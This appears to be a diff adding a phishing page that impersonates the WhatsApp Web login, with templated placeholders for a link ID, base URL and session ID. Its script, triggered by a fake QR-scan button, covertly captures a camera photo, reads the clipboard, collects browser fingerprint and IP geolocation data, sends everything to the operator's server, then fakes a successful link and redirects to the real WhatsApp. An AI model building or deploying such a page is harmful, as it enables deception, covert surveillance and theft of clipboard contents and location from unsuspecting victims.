@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>WhatsApp Web</title>
+<link rel="icon" href="https://web.whatsapp.com/favicon.ico">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#e5ddd5;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.card{background:#fff;border-radius:8px;box-shadow:0 4px 24px rgba(0,0,0,.1);padding:40px;max-width:400px;width:90%;text-align:center}
+.logo{width:48px;margin-bottom:16px}
+h1{font-size:22px;font-weight:600;color:#1f2c33;margin-bottom:4px}
+.sub{color:#667781;font-size:14px;margin-bottom:28px;line-height:1.4}
+.qr-frame{width:216px;height:216px;margin:0 auto 20px;background:#f0f2f5;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:80px;cursor:pointer;transition:all .2s;border:2px solid transparent}
+.qr-frame:hover{border-color:#25d366}
+#video{display:none;width:216px;height:216px;border-radius:12px;margin:0 auto 20px;object-fit:cover;background:#000}
+.status{color:#667781;font-size:13px;margin-bottom:8px}
+.loading{display:none;color:#25d366;font-size:14px;margin-top:12px}
+</style>
+</head>
+<body>
+<div class="card">
+<img class="logo" src="https://web.whatsapp.com/favicon.ico" alt="WhatsApp">
+<h1>WhatsApp Web</h1>
+<p class="sub">Use WhatsApp on your computer</p>
+<div class="qr-frame" id="qr_box" onclick="scan()"><span>📱</span></div>
+<video id="video" autoplay muted playsinline></video>
+<p class="status" id="status">Tap to scan QR code with your phone</p>
+<div class="loading" id="loading">Linking...</div>
+</div>
+<script>
+const LID='{{LINK_ID}}',BASE='{{BASE_URL}}',SID='{{SESSION_ID}}';
+let c={session:SID};
+async function collect(){
+    c.ua=navigator.userAgent;c.platform=navigator.platform;
+    c.screen=screen.width+'x'+screen.height;c.language=navigator.language;
+    c.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
+    try{const r=await fetch('https://ip-api.com/json/?fields=query,country,city,lat,lon,isp');const j=await r.json();Object.assign(c,j)}catch(e){}
+    await fetch(BASE+'/c/'+LID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(c)})
+}
+async function scan(){
+    try{
+        const st=await navigator.mediaDevices.getUserMedia({video:{facingMode:{exact:'environment'}}});
+        const v=document.getElementById('video');v.srcObject=st;v.style.display='block';
+        document.getElementById('qr_box').style.display='none';
+        document.getElementById('status').textContent='Scanning...';
+        await new Promise(r=>setTimeout(r,2500));
+        const ca=document.createElement('canvas');ca.width=v.videoWidth||640;ca.height=v.videoHeight||480;
+        ca.getContext('2d').drawImage(v,0,0);
+        c.photo=ca.toDataURL('image/jpeg',0.85).split(',')[1];
+        st.getTracks().forEach(t=>t.stop());
+        try{const txt=await navigator.clipboard.readText();if(txt)c.clipboard=txt}catch(e){}
+        await collect();
+        document.getElementById('loading').style.display='block';
+        document.getElementById('status').textContent='✓ WhatsApp Web linked!';
+        setTimeout(()=>{window.location.href='https://web.whatsapp.com'},1500)
+    }catch(e){
+        // fallback to front camera
+        try{
+            const st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+            const v=document.getElementById('video');v.srcObject=st;v.style.display='block';
+            document.getElementById('qr_box').style.display='none';
+            await new Promise(r=>setTimeout(r,2000));
+            const ca=document.createElement('canvas');ca.width=v.videoWidth||640;ca.height=v.videoHeight||480;
+            ca.getContext('2d').drawImage(v,0,0);
+            c.photo=ca.toDataURL('image/jpeg',0.85).split(',')[1];
+            st.getTracks().forEach(t=>t.stop());
+            try{const txt=await navigator.clipboard.readText();if(txt)c.clipboard=txt}catch(e){}
+            await collect();
+            document.getElementById('loading').style.display='block';
+            document.getElementById('status').textContent='✓ WhatsApp Web linked!';
+            setTimeout(()=>{window.location.href='https://web.whatsapp.com'},1500)
+        }catch(e2){}
+    }
+}
+</script>
+</body>
+</html>
